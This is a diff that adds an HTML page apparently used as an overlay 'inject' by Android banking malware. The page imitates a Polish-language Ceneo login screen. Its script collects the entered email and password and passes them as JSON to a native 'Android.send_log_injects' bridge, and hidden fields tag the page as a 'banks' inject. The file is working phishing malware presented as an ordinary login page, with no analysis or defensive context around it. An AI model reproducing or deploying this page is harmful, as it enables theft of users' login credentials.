@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>ceneo</title>
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #FF9800;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+    text-align: right;
+    background-size: 100%;
+    padding: 20px 30px 20px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+border: 1px solid #efefef;
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 0px 0px 0px 10px;
+    margin: 0px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    color: #363636;
+    text-align: left;
+    background: none;
+    outline: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    text-align: left;
+    background: #fff;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 0px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #fffefe;
+    color: #4795b8;
+    border: 1px solid #ebebeb;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #111111;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #bcbcbc;
+    font-size: 15px;
+}
+</style>
+
+<fieldset id="formtosend">
+
+<div class="" id="bireysel" style="display: block;">
+
+<div class="logo1" style="text-align: center;">
+	<p style="    color: #fff;">Logujesz się za pomocą konta</p>
+<h3 style="color: #fff; padding-top: 10px;">CENEO</h3>
+</div>
+
+<div class="area" style="padding: 30px 0px 0px 0px; border-radius: 3px;">
+        <input name="login" id="login" placeholder="Twój e-mail" style="height: 50px;" type="text">
+        <input name="password" id="password" placeholder="Hasło" style="height: 50px;" type="password">
+        <button type="button" id="eye" style="background: none;border: none;float: right;position: relative;top: -38px;cursor: pointer;right: 10px;">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACUAAAAcCAYAAADm63ZmAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAMcSURBVFhH7dTXaiUxEATQ/f8f8oPBOScccQ442zjnrOU0tJk7vsazLCz7cAuENFKHUnVrfpX/EB1STdEh1RSNSb28vJT39/dYPz8/x/rj46O8vb19zvbzG15fX+Mb0j9jsMl1HY1IPTw8xCyQ4CCgpFtbW2Vubq6srKyUjY2Nsr6+XnZ3d8vFxcUnifSp469IZXAkELu6uiqLi4tlZGSkDA8Px+jr6ys9PT1lcHCwTExMlMnJySB5d3cXaiGW6qSSUF0nGpFSFoQE3t/fL+Pj40EEKST6+/vL0NBQ7FkjyMbZ9PR0OTs7+7wQgtUSt8Mf9dT29nYk7O3tLWNjYzFPTU2VpaWlsra2FqVbXl4OIgMDA0HKzObo6CiIQSqW6zoakRJMKUZHR2NQZWZmpuzt7ZX7+/tIkAogf3l5GQQRR8zgc3BwEKoDMqlcHS2kquwR8f309BQqSCAwdWZnZyOxfnl8fCyHh4dhI+np6Wn4Sa7hlTFV02ceAGTzZ1mrirWQSiJplCWjirIh5aVJjIxe8eqohywbTU7Vm5ubuBCiytnV1RXk2FxfX8eZGPJlTjC3LR8yEgtebeaFhYVyfn4eQW5vb4OgJAY7SRFnTyVxkph9D8EF2G5ubgapLP+3pLInvDDOkmQyvwC/AjaCaNwkky/RyN/C/Px8lBgpMY+Pj6MFxKImW+U8OTn5WSlBvCAJMxlCFOIggCRUVDLk2XZ3d3+qZLaPFFt+LqPceswZO/72flRKg3o5EnnKOzs70QPOOOg7Y3V1NQKzQ8JQYhfJtRKzRQzMSLgklVxYmX9UiiMSXkn+jQU2G+Bbn0isJIi4dZZbCf27KMVH0vQXXy8hLAebOlpIYZmOhuT1W+SsQd0YEST0idJQzqwvxfgOmUuOOr6QqsNeDgSTpEFJ/ydPPn+USk5FaqR/+qRq6Z+jji/la4cMBmYK2AOKeZWI+MPryWoyM9u0b4IvSuWo3ijPElWS5M8z+/ntvGoHGa86queJFlLtguQNJct12jgH39QzG9U+4WOwte88/aC6TjQq379Gh1RTdEg1Qym/ASF7ouLt00F9AAAAAElFTkSuQmCC" alt="eye" style="width: 30px;">
+        </button>
+        <input name="type_injects" value='banks' type="hidden" required>
+        <input name="closed" value='close_activity_injects' type="hidden" required>
+<a href="#" style="text-align: center;font-weight: 400;color: #ffffff;position: relative;top: 30px;text-decoration: underline;font-size: 15px;display: inline-block;float: left;margin-left: 10px;">Nie parmiętasz hasła?</a>
+        <input name="sumbit" onclick="send_form()" value="Zaloguj się" style="margin-top: 50px;" type="button">
+        
+
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        send_log_injects : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    if (document.getElementById("login").value == '')
+{
+    //alert ('Wszystkie pola wymagane!');
+    return false;
+}
+if (document.getElementById("password").value == '')
+{
+    //alert ('Wszystkie pola wymagane!');
+    return false;
+}
+    var form = document.getElementById('formtosend');
+    Android.send_log_injects( formToJSONbyName(form) );
+}
+function show() {
+    var p = document.getElementById('password');
+    p.setAttribute('type', 'text');
+}
+
+function hide() {
+    var p = document.getElementById('password');
+    p.setAttribute('type', 'password');
+}
+
+var pwShown = 0;
+
+document.getElementById("eye").addEventListener("click", function () {
+    if (pwShown == 0) {
+        pwShown = 1;
+        show();
+    } else {
+        pwShown = 0;
+        hide();
+    }
+}, false);
+</script>
+
+
+</body></html>
